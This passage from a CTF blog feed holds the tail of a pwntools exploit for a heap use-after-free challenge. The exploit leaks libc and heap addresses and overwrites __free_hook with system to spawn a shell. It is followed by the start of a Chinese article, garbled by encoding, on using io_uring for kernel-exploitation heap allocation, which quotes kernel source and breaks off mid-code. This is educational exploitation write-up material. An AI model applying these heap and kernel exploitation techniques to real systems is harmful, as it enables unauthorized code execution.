class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;login&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    login(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">          <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">new_account(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>),</span><br><span class="line">            <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0xffffffff</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>), <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="string">b&#x27;dzhsb\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>), flat([<span class="number">0</span>]))</span><br><span class="line">delete_account(flat(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;n&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;&gt;&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x5d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">password = heap_base + <span class="number">0x620</span></span><br><span class="line">account = heap_base + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">login(flat(account).ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), flat(password))</span><br><span class="line">update_info(flat(free_hook, [<span class="number">0</span>]*<span class="number">4</span>), flat(password))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>, flat(system_addr), <span class="number">0x0</span>)</span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;diary&quot;&gt;&lt;a href=&quot;#diary&quot; class=&quot;headerlink&quot; title=&quot;diary&quot;&gt;&lt;/a&gt;diary&lt;/h2&gt;&lt;h3 id=&quot;åˆ©ç”¨åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨åˆ†æ&quot;</summary>
      
    
    
    
    <category term="æ¯”èµ›å¤ç°" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>io_uringåœ¨kernel pwnä¸­çš„ä¼˜å¼‚è¡¨ç°</title>
    <link href="https://cv196082.gitee.io/2023/04/20/io-uring/"/>
    <id>https://cv196082.gitee.io/2023/04/20/io-uring/</id>
    <published>2023-04-20T10:13:02.000Z</published>
    <updated>2023-04-20T10:13:20.832Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç›®å‰å„ç§æ¯”èµ›çš„å„ç§èµ›åˆ¶çœŸçš„æ˜¯è®©äººååˆ†éš¾å—ï¼Œä»¥è‡³äºæ„Ÿè§‰è‡ªå·±ä¸æ€ä¹ˆé€‚åˆæ‰“æ¯”èµ›äº†ã€‚æ‰€ä»¥æ‰“ç®—é™ä¸‹å¿ƒæ¥å¤ç°ä¸€åœºæ¯”èµ›ï¼Œåœ¨RCTFä¸­æ‰¾åˆ°åˆ†å€¼æœ€ä½çš„ä¸€é“é¢˜ã€‚åšçš„è¿‡ç¨‹ä¸­è¶Šçœ‹è¶Šä¸å¯¹åŠ²ï¼Œè¿˜ç®—æ˜¯æœ‰éš¾åº¦çš„ä¸€é“å†…æ ¸å †é¢˜æ€ä¹ˆè¢«æ‰“çƒ‚äº†ï¼Œä¸€æœæ‰å‘ç°æ˜¯æœ‰éé¢„æœŸè§£ã€‚ä½†æˆ‘å¤´é“ï¼Œé™ä¸‹å¿ƒæ¥ç”¨é¢„æœŸè§£æ‰“ï¼Œç´¢æ€§åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººåœ¨è¿™é“é¢˜ç›®ä¸­å‘ç°äº†ä¸å¾—äº†çš„ä¸œè¥¿ã€‚</p><h3 id="ç›®å‰çš„çª˜å¢ƒ"><a href="#ç›®å‰çš„çª˜å¢ƒ" class="headerlink" title="ç›®å‰çš„çª˜å¢ƒ"></a>ç›®å‰çš„çª˜å¢ƒ</h3><p>å¦‚æœå­˜åœ¨UAFçš„objectè§„å®šå¤§å°åªèƒ½ä¸º0x10çš„è¯ï¼Œå„ä½è‚¯å®šä¼šæƒ³åˆ°ä½¿ç”¨å¯ä»¥å®ç°åˆ†é…ä»»æ„å¤§å°objectçš„å‡½æ•°ã€‚</p><p>æ‰€ä»¥å¦‚æœæåˆ°å†…æ ¸ä¸­å¯ä»¥è¾¾åˆ°ä»»æ„å¤§å°çš„ç»“æ„ä½“æ—¶ä¼°è®¡å„ä½ä¼šæƒ³åˆ°<code>setxattr</code>ã€<code>msg_msg</code>ä¹‹ç±»çš„ã€‚ä½†æ˜¯è¿™ä¸¤è€…å‡å…·æœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼Œ<code>setxattr</code>å‰é¢æåˆ°è¿‡ï¼Œè¿™ä¸ªåœ¨è°ƒç”¨å®Œæˆåä¼š<code>kfree</code>æ‰ä½¿ç”¨çš„objectï¼Œå¹¶ä¸”åœ¨é«˜ç‰ˆæœ¬çš„linuxå†…æ ¸ä¸­è¿™ä¸ªå‡½æ•°æ—©å·²è¢«ä¿®æ”¹äº†ã€‚<code>msg_msg</code>è¿™ä¸ªç»“æ„ä½“å°±æ›´ä¸ºæ˜æ˜¾äº†ï¼Œéœ€è¦ç”¨å¾ˆå¤§çš„ç©ºé—´æ¥ä¿å­˜ç»“æ„ä½“ä¸­çš„æˆå‘˜ã€‚</p><p>å› ä¸ºæ˜¯sizeå¾ˆå°çš„å †å—æ‰€ä»¥å„ä½å¯èƒ½è¿˜ä¼šæ€è€ƒåˆ°ä¸€éƒ¨åˆ†ç»“æ„ä½“ä¾‹å¦‚:<code>seq_operations</code>ã€<code>shm_file_data</code>ä¹‹ç±»çš„ã€‚ä½†æ˜¯ä»–ä»¬çš„sizeä¹Ÿæ˜¯0x20ã€‚</p><h2 id="IO-uring"><a href="#IO-uring" class="headerlink" title="IO_uring"></a>IO_uring</h2><p>ç½‘ä¸Šå…³äºio_uringå¯¹äºkernel pwnçš„åˆ©ç”¨ç›¸å¯¹è¾ƒå°‘ï¼Œç‰¹åˆ«æ˜¯ä¸­æ–‡æ–‡ç« ï¼Œæˆ‘å‡ ä¹æ²¡æœåˆ°ï¼Œæœåˆ°çš„ä¹Ÿåªæ˜¯å¯¹å…¶è¿›è¡Œä»‹ç»ï¼Œå¹¶æ²¡æœ‰å®é™…çš„æ“ä½œä¹‹ç±»çš„ã€‚æ‰€ä»¥ä¸ºäº†å†™è¿™ç¯‡æ–‡ç« æˆ‘çœ‹äº†ä¸¤å¤©Linuxå†…æ ¸çš„æºç ï¼Œçœ¼ç›éƒ½è¦çäº†ï¼ï¼ï¼</p><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å…³äºIO_uringçš„ä»‹ç»åœ¨ç½‘ä¸Šå…¶å®å¾ˆå¤šã€‚<code>io_uring</code>æ˜¯2019å¹´Linux 5.1å†…æ ¸é¦–æ¬¡å¼•å…¥çš„é«˜æ€§èƒ½å¼‚æ­¥I/Oæ¡†æ¶ï¼Œå¯ä»¥æ˜¾ç€åŠ é€ŸI/Oå¯†é›†å‹åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚ä¸ºäº†å‡å°‘ I/O æ“ä½œæ—¶çš„å†…å­˜æ˜ å°„ï¼Œè¯¥æ¨¡å—å…è®¸ç”¨æˆ·é¢„å…ˆæ³¨å†Œä¸€äº›å›ºå®šçš„ I/O ç¼“å†²åŒºï¼Œä»¥ä¾¿è¿™äº›ç¼“å†²åŒºå¯ä»¥è¢«é‡ç”¨ã€‚è¿™é‡Œæ¨èå¤§å®¶æœ€å¥½å»çœ‹çœ‹å…³äºä»–çš„å®ç°ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é‡Œç®—æ˜¯è¿™ç¯‡æ–‡ç« çš„é‡ç‚¹ï¼</p><h4 id="åˆ†é…object"><a href="#åˆ†é…object" class="headerlink" title="åˆ†é…object"></a>åˆ†é…object</h4><p>å½“æˆ‘ä»¬è°ƒç”¨<code>io_uring_register_buffers_tags</code>å‡½æ•°æ—¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_tags</span><span class="params">(struct io_uring *ring,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_register</span> <span class="title">reg</span> =</span> &#123;</span><br><span class="line">.nr = nr,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS2, &amp;reg, <span class="keyword">sizeof</span>(reg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DIV_ROUND_UP(n,d) (((n) + (d) - 1) / (d))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __cold <span class="keyword">void</span> **<span class="title">io_alloc_page_table</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> i, nr_tables = DIV_ROUND_UP(size, PAGE_SIZE);</span><br><span class="line"><span class="keyword">size_t</span> init_size = size;</span><br><span class="line"><span class="keyword">void</span> **table;</span><br><span class="line"></span><br><span class="line">table = kcalloc(nr_tables, <span class="keyword">sizeof</span>(*table), GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nr_tables; i++) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> this_size = <span class="keyword">min_t</span>(<span class="keyword">size_t</span>, size, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">table[i] = kzalloc(this_size, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (!table[i]) &#123;</span><br><span class="line">io_free_page_table(table, init_size);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">size -= this_size;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆä¼šè¿›å…¥ä¸Šé¢è¿™ä¸ªå‡½æ•°ä¸­ï¼Œå…¶ä¸­çš„sizeæ˜¯æˆ‘ä»¬å¯ä»¥ç›´æ¥è¿›è¡Œæ§åˆ¶çš„ï¼Œå¯ä»¥æ˜æ˜¾çš„çœ‹å‡ºæ¥è¿™é‡Œå¯ä»¥çœŸæ­£å®ç°ä»»æ„å¤§å°åˆ†é…ï¼Œå¹¶ä¸”åœ¨<code>table[i]</code>ä¹Ÿå°±æ˜¯<code>ctx-&gt;buf_data-&gt;tags[i]</code>ä¸­ä¸å«æœ‰ä»»ä½•æŒ‡é’ˆæˆ–è€…æ•°æ®ä¹‹ç±»çš„ï¼Œåœ¨<code>table</code>ä¹Ÿå°±æ˜¯<code>ctx-&gt;buf_data-&gt;tags</code>ä¸­åªå«æœ‰åé¢åˆ†é…çš„objectæŒ‡é’ˆã€‚</p><h4 id="æ›´æ–°object"><a href="#æ›´æ–°object" class="headerlink" title="æ›´æ–°object"></a>æ›´æ–°object</h4><p>å½“æˆ‘ä»¬è°ƒç”¨<code>io_uring_register_buffers_update_tag</code>å‡½æ•°æ—¶ï¼Œå¯ä»¥å¯¹tagsä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šé¢<code>table[i]</code>ä¸­åˆ†é…çš„objectè¿›è¡Œå†…å®¹æ›´æ–°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_update_tag</span><span class="params">(struct io_uring *ring, <span class="keyword">unsigned</span> off,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> __u64 *tags,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">unsigned</span> nr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_rsrc_update2</span> <span class="title">up</span> =</span> &#123;</span><br><span class="line">.offset= off,</span><br><span class="line">.data = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)iovecs,</span><br><span class="line">.tags = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)tags,</span><br><span class="line">.nr = nr,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> do_register(ring, IORING_REGISTER_BUFFERS_UPDATE, &amp;up, <span class="keyword">sizeof</span>(up));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IO_RSRC_TAG_TABLE_SHIFT(PAGE_SHIFT - 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> u64 *<span class="title">io_get_tag_slot</span><span class="params">(struct io_rsrc_data *data, <span class="keyword">unsigned</span> <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> off = idx &amp; IO_RSRC_TAG_TABLE_MASK;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table_idx = idx &gt;&gt; IO_RSRC_TAG_TABLE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;data-&gt;tags[table_idx][off];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __io_sqe_buffers_update(struct io_ring_ctx *ctx,</span><br><span class="line">   struct io_uring_rsrc_update2 *up,</span><br><span class="line">   <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span><br><span class="line">&#123;</span><br><span class="line">u64 __user *tags = u64_to_user_ptr(up-&gt;tags);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>, __<span class="title">user</span> *<span class="title">iovs</span> =</span> u64_to_user_ptr(up-&gt;data);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">last_hpage</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">bool</span> needs_switch = <span class="literal">false</span>;</span><br><span class="line">__u32 done;</span><br><span class="line"><span class="keyword">int</span> i, err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;buf_data)</span><br><span class="line"><span class="keyword">return</span> -ENXIO;</span><br><span class="line"><span class="keyword">if</span> (up-&gt;offset + nr_args &gt; ctx-&gt;nr_user_bufs)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (done = <span class="number">0</span>; done &lt; nr_args; done++) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span> *<span class="title">imu</span>;</span></span><br><span class="line"><span class="keyword">int</span> offset = up-&gt;offset + done;</span><br><span class="line">u64 tag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err = io_copy_iov(ctx, &amp;iov, iovs, done);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (tags &amp;&amp; copy_from_user(&amp;tag, &amp;tags[done], <span class="keyword">sizeof</span>(tag))) &#123;</span><br><span class="line">err = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_buffer_validate(&amp;iov);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!iov.iov_base &amp;&amp; tag) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = io_sqe_buffer_register(ctx, &amp;iov, &amp;imu, &amp;last_hpage);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">i = array_index_nospec(offset, ctx-&gt;nr_user_bufs);</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;user_bufs[i] != ctx-&gt;dummy_ubuf) &#123;</span><br><span class="line">err = io_queue_rsrc_removal(ctx-&gt;buf_data, i,</span><br><span class="line">    ctx-&gt;rsrc_node, ctx-&gt;user_bufs[i]);</span><br><span class="line"><span class="keyword">if</span> (unlikely(err)) &#123;</span><br><span class="line">io_buffer_unmap(ctx, &amp;imu);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span 